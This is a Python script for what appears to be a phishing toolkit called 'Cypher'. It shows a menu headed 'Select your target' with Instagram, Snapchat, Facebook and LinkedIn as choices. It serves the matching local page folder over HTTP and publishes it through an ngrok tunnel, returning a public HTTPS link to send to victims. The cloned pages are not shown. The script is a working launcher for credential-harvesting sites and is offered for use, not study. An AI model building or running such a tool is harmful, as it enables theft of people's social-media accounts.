from pyfiglet import Figlet
from termcolor import colored
import colorama
import random
import os
import http.server
import socketserver
import subprocess
import webbrowser
import time
import requests
import json
import re
import threading

# Initialize colorama for Windows
colorama.init()

def install_ngrok():
    print("\nChecking ngrok installation...")
    try:
        # Check if ngrok is installed
        subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
        print("✓ Ngrok is already installed")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("× Ngrok not found. Installing...")
        try:
            # Add ngrok repository and install
            os.system('curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null')
            os.system('echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list')
            os.system('sudo apt update')
            os.system('sudo apt install ngrok -y')
            print("✓ Ngrok installed successfully")
        except Exception as e:
            print(f"× Error installing ngrok: {str(e)}")
            return False
    return True

def setup_ngrok_auth():
    print("\nChecking ngrok authentication...")
    try:
        # Try to get tunnels to check if auth is set
        requests.get("http://localhost:4040/api/tunnels")
        print("✓ Ngrok auth token already configured")
        return True
    except:
        print("× Ngrok auth token not configured")
        print("\nPlease get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
        token = input("Enter your ngrok auth token: ").strip()
        
        if token:
            try:
                result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
                                     capture_output=True, text=True)
                if result.returncode == 0:
                    print("✓ Auth token configured successfully")
                    return True
                else:
                    print(f"× Error configuring auth token: {result.stderr}")
                    return False
            except Exception as e:
                print(f"× Error configuring auth token: {str(e)}")
                return False
        else:
            print("× No token provided")
            return False

def serve_website(platform):
    # Define the directory to serve based on platform
    if platform.lower() == 'instagram':
        directory = 'web/instagram'
    elif platform.lower() == 'snapchat':
        directory = 'web/snapchat'
    elif platform.lower() == 'facebook':
        directory = 'web/facebook'
    elif platform.lower() == 'linkedin':
        directory = 'web/linkedin'
    else:
        print("Invalid platform selected")
        return None

    # Change to the selected platform directory
    os.chdir(directory)
    
    try:
        # Start a simple HTTP server in the background
        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
        Handler = http.server.SimpleHTTPRequestHandler
        
        try:
            httpd = socketserver.TCPServer(("", PORT), Handler)
            print(f"\n✓ Local server started on port {PORT}")
        except OSError as e:
            print(f"× Port {PORT} is in use, trying another port...")
            PORT = random.randint(9001,10000)
            httpd = socketserver.TCPServer(("", PORT), Handler)
            print(f"✓ Local server started on port {PORT}")
        
        # Start the server in a separate process
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        # Kill any existing ngrok processes
        if os.name == 'nt':  # Windows
            os.system('taskkill /f /im ngrok.exe 2>nul')
        else:  # Linux/Mac
            os.system('pkill ngrok')
        
        time.sleep(1)
        
        # Start ngrok in background
        if os.name == 'nt':  # Windows
            subprocess.Popen(f"ngrok http {PORT}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:  # Linux/Mac
            subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2)  # Give ngrok time to start
        
        # Get the public URL from ngrok API
        try:
            response = requests.get("http://localhost:4040/api/tunnels")
            tunnels = response.json()['tunnels']
            if tunnels:
                url = tunnels[0]['public_url']
                if not url.startswith('https'):
                    url = url.replace('http', 'https')
                os.chdir("../../")  # Return to original directory
                return url
            else:
                print("× Error: No ngrok tunnels found")
                print("Try configuring your auth token again:")
                setup_ngrok_auth()
                os.chdir("../../")
                return None
                
        except Exception as e:
            print(f"× Error getting ngrok URL: {str(e)}")
            print("Try configuring your auth token again:")
            setup_ngrok_auth()
            os.chdir("../../")
            return None
            
    except Exception as e:
        print(f"\n× Error: {str(e)}")
        print("\nTroubleshooting steps:")
        print("1. Make sure your auth token is correct")
        print("2. Check your internet connection")
        print("3. Make sure no other ngrok instances are running")
        print("4. Try running with sudo: sudo python3 main.py")
        os.chdir("../../")
        return None

def print_menu(active_url=None):
    # Create a Figlet object with a different font style
    figlet = Figlet(font='slant')
    
    # Text to display
    text = "Cypher"
    
    # Generate the ASCII art
    ascii_art = figlet.renderText(text)
    
    # Colors for rainbow effect
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    
    # Get the width and height of the ASCII art
    ascii_lines = ascii_art.split('\n')
    max_width = max(len(line) for line in ascii_lines)
    height = len(ascii_lines)
    
    # Create decorative frame with proper width
    frame_width = max_width + 8
    frame_width = frame_width + (frame_width % 2)  # Make sure width is even
    top_border = colored('╔' + '═' * (frame_width-2) + '╗', 'cyan')
    bottom_border = colored('╚' + '═' * (frame_width-2) + '╝', 'cyan')
    empty_line = colored('║' + ' ' * (frame_width-2) + '║', 'cyan')
    
    # Create decorative top and bottom bars with proper width
    top_decoration = '█' + '▀' * (frame_width-4) + '█'
    bottom_decoration = '█' + '▄' * (frame_width-4) + '█'
    
    # Build the final output with background
    final_art = [
        top_border,
        colored('║' + top_decoration + '║', 'cyan'),
        empty_line
    ]
    
    # Add the rainbow text with centered alignment
    color_index = 0
    for line in ascii_lines:
        if line.strip():
            padding = (frame_width - 2 - len(line)) // 2
            colored_line = colored(line, colors[color_index % len(colors)])
            right_padding = frame_width - 2 - padding - len(line)
            final_line = colored('║', 'cyan') + ' ' * padding + colored_line + ' ' * right_padding + colored('║', 'cyan')
            final_art.append(final_line)
            color_index += 1
        else:
            final_art.append(empty_line)
    
    # Add active URL if available
    if active_url:
        url_text = f"Active URL: {active_url}"
        padding = (frame_width - 2 - len(url_text)) // 2
        url_line = colored('║', 'cyan') + ' ' * padding + colored(url_text, 'green') + ' ' * (frame_width - 2 - padding - len(url_text)) + colored('║', 'cyan')
        final_art.extend([empty_line, url_line, empty_line])
    
    # Add menu options
    menu_options = [
        "[ Select your target ]",
        "",
        "[1] Instagram",
        "[2] Snapchat",
        "[3] Facebook",
        "[4] LinkedIn",
        "[5] Exit",
        "",
        "Enter your choice: "
    ]
    
    # Add menu options with proper centering
    for option in menu_options[:-1]:
        padding = (frame_width - 2 - len(option)) // 2
        final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
        final_art.append(final_line)
    
    final_art.extend([
        empty_line,
        colored('║' + bottom_decoration + '║', 'cyan'),
        bottom_border
    ])
    
    # Add matrix-style side decorations
    side_dec_left = [
        colored('░▒▓█', 'green') + ' ',
        colored('▓▒░█', 'green') + ' ',
        colored('░▒▓█', 'green') + ' '
    ]
    
    side_dec_right = [
        ' ' + colored('█▓▒░', 'green'),
        ' ' + colored('█░▒▓', 'green'),
        ' ' + colored('█▓▒░', 'green')
    ]
    
    # Print the final composition with side decorations
    for i, line in enumerate(final_art):
        if i > 0 and i < len(final_art) - 1:
            left_dec = side_dec_left[i % len(side_dec_left)]
            right_dec = side_dec_right[i % len(side_dec_right)]
            print(left_dec + line + right_dec)
        else:
            print(line)
    
    # Add bottom matrix rain effect
    matrix_bottom = ''.join(colored('▀▄'[(i+random.randint(0,1))%2], 'green') for i in range(frame_width))
    print(' ' * 4 + matrix_bottom)
    
    return input(colored(menu_options[-1], 'white'))

def main():
    # Check and install ngrok if needed
    if not install_ngrok():
        print("Failed to install ngrok. Please install it manually.")
        return
    
    # Setup ngrok authentication
    if not setup_ngrok_auth():
        print("Failed to configure ngrok auth token. Please try again.")
        return
    
    active_url = None
    while True:
        choice = print_menu(active_url)
        if choice == '1':
            active_url = serve_website('instagram')
        elif choice == '2':
            active_url = serve_website('snapchat')
        elif choice == '3':
            active_url = serve_website('facebook')
        elif choice == '4':
            active_url = serve_website('linkedin')
        elif choice == '5':
            print("\nExiting...")
            # Kill ngrok on exit
            if os.name == 'nt':
                os.system('taskkill /f /im ngrok.exe 2>nul')
            else:
                os.system('pkill ngrok')
            break
        else:
            print("\nInvalid choice! Press Enter to continue...")
            input()
        
        # Clear screen for Windows
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main() 